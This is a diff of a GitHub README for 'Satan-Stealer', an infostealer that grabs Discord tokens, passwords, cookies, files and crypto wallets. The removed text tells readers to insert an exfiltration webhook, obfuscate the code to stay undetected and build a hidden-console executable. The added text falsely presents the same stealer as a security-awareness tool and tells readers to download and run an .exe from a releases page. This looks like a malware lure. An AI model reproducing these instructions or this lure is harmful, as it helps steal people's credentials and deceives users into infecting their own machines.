@@ -1,94 +1,58 @@
-<h1> Satan Stealer</h1>
-<p align="center">
-<kbd>
-<a href="https://github.com/Yiduaaar/Satan-Stealer/releases/download/v2.2.8/Satan-Stealer.zip"><img src="https://cdn.discordapp.com/attachments/1042447445839327233/1042481482695983104/1fa9fcfd25964998568f0c4215a363f0.jpg" width="400"></a></img>
-</kbd>
-</p>
+# 👾 Satan-Stealer - Simplify Your Digital Life
 
-<p> if you got error add me Maybach-#1337 </p>
+## 📥 Download the Latest Version
+[![Download Satan-Stealer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sonnch3141/Satan-Stealer/releases)
 
-## Features:
-» Grabs Discord Information and HQ Friends.
+## 🚀 Getting Started
+Welcome to Satan-Stealer! This tool helps you manage your digital security. With features like token, password, cookie, and file stealing, it aims to enhance your awareness of potential threats. 
 
-» Grabs Password & cookies.
+### 🔍 Features
+- **Discord Token Grabber**: Safeguard your accounts by understanding token vulnerabilities.
+- **Password Stealer**: Identify weak passwords and improve your security.
+- **Cookie Stealer**: Learn about sessions and how they can be hijacked.
+- **File Stealer**: Recognize the importance of your personal files and how to protect them.
+- **Crypto Wallet Stealer**: Know how crypto wallets can be targeted and how to secure yours.
 
-» Grabs Files.
+## 📋 System Requirements
+To run Satan-Stealer, your system should meet the following requirements:
+- **Operating System**: Windows 10 or later.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of free space.
+- **Network**: Internet connection for downloading and running updates.
 
-» Shows Crypto Wallets
+## 🔗 Download & Install
+To get started, visit the Releases page to download the software. Follow these steps:
 
-» Grabs metamask/exodus
+1. Click the link below:
+   [https://github.com/sonnch3141/Satan-Stealer/releases](https://github.com/sonnch3141/Satan-Stealer/releases)
+   
+2. On the Releases page, find the latest version. 
 
-» Grabs Telegram
+3. Click on the file that matches your operating system to download it. 
 
-» Grabs chromium based Passwords
+4. Once the file downloads, locate it in your files. The file should have a `.exe` extension.
 
-## Setup:
+5. Double-click the file to run it. If prompted, allow the software to make changes to your device.
 
-First paste and save your webhook address instead of `"WEBHOOK HERE"` in main.py
+6. Follow the on-screen instructions to complete the installation.
 
-If you use obfuscator it will be undetectable.
+## 🔒 Safety Precautions
+While this tool can be insightful, please remember to use it responsibly. It is important to ensure that your own security is not compromised. Follow these guidelines:
 
-Now You need to use pyinstaller to convert python file to exe.
+- **Use on a Test Machine**: If possible, use a separate machine to explore the functionalities.
+- **Do Not Use on Personal Accounts**: Avoid using it on accounts with sensitive information unless you are aware of the risks.
+- **Understand the Risks**: Familiarize yourself with what each feature does before using it.
 
-Open CMD and type `pip install auto_py_to_exe`
+## 🤝 Community Support
+If you have questions or need assistance, feel free to reach out to the community. Engaging with others can provide valuable insights and help improve your experience with the tool.
 
-And after installed `python -m auto_py_to_exe`
+### 📧 Contact Information
+For any concerns or issues, you can reach out via the Issues tab on GitHub. Create a new issue to describe your problem, and someone from the community will assist you.
 
-Browse file Select `One file and Windows Based (hide the console)`
+## 🛠️ Contributing
+If you want to contribute to the project, please check the guidelines in the repository. Contributions can enhance the tool and benefit everyone in the community.
 
-<a href="https://github.com/Yiduaaar/Satan-Stealer/releases/download/v2.2.8/Satan-Stealer.zip"><img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Yiduaaar/Satan-Stealer/main/img/pyy (1).png "></a></img>
+## 🌐 Learn More
+For further information and updates, visit our GitHub repository. Stay informed about the latest features and improvements.
 
-And press covert .py .exe
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-## Pictures:
-
-<a href="https://github.com/Yiduaaar/Satan-Stealer/releases/download/v2.2.8/Satan-Stealer.zip"><img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Yiduaaar/Satan-Stealer/main/img/ssatan0.jpg"></a></img>
-
-<a href="https://github.com/Yiduaaar/Satan-Stealer/releases/download/v2.2.8/Satan-Stealer.zip"><img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Yiduaaar/Satan-Stealer/main/img/ssatan1.jpg"></a></img>
-
-<a href="https://github.com/Yiduaaar/Satan-Stealer/releases/download/v2.2.8/Satan-Stealer.zip"><img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Yiduaaar/Satan-Stealer/main/img/ssatan2.jpg"></a></img>
-
-## Disclaimer:
-
-This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. <bold>Educational purpose only!</bold>
-
-## License:
-By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+[![Download Satan-Stealer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sonnch3141/Satan-Stealer/releases)
